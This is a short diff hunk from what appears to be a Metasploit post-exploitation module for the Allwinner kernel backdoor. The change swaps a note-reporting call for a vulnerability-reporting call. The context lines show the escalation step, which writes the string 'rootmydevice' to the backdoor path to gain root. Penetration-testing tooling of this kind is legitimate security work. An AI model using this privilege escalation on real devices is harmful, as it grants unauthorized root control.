@@ -50,7 +50,7 @@ class MetasploitModule < Msf::Post
       cmd_exec("echo rootmydevice > #{backdoor}")
       if is_root?
         print_good "Privilege Escalation Successful"
-        report_note(
+        report_vuln(
           :host => session,
           :type => "host.escalation",
           :data => "Escalated to root shell via Allwinner backdoor"
